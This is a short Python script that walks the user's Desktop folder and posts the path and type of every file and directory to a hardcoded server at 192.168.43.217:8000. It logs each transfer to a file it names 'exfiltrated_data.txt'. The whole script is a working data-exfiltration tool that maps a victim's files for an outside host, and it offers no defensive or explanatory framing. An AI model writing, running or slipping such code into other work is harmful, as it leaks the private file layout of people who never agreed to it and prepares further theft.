import os
import requests
import json

def send_structure(path, type):
    # Prepare the data to send
    data = {
        'type': type,
        'path': path
    }
    
    # Send data to the Flask server
    response = requests.post('http://192.168.43.217:8000/structure', json=data)
    
    if response.status_code == 200:
        # Log the successfully sent paths to the file
        with open("exfiltrated_data.txt", "a") as log_file:
            log_file.write(f"Successfully sent: {path}\n")
    else:
        # Log the failed paths to the file
        with open("exfiltrated_data.txt", "a") as log_file:
            log_file.write(f"Failed to send: {path}\n")

def show_dir(path):
    # Check if the path is a valid directory
    if not os.path.isdir(path):
        return
    
    # Walk through the directory
    for root, dirs, files in os.walk(path):
        # Send directories to Flask server
        for dir_name in dirs:
            full_path = os.path.join(root, dir_name)
            send_structure(full_path, 'directory')
        
        # Send files to Flask server
        for file_name in files:
            full_path = os.path.join(root, file_name)
            send_structure(full_path, 'file')

if __name__ == '__main__':
    # Start scanning from the 'Desktop' directory
    desktop_path = os.path.expanduser('~/Desktop')
    show_dir(desktop_path)
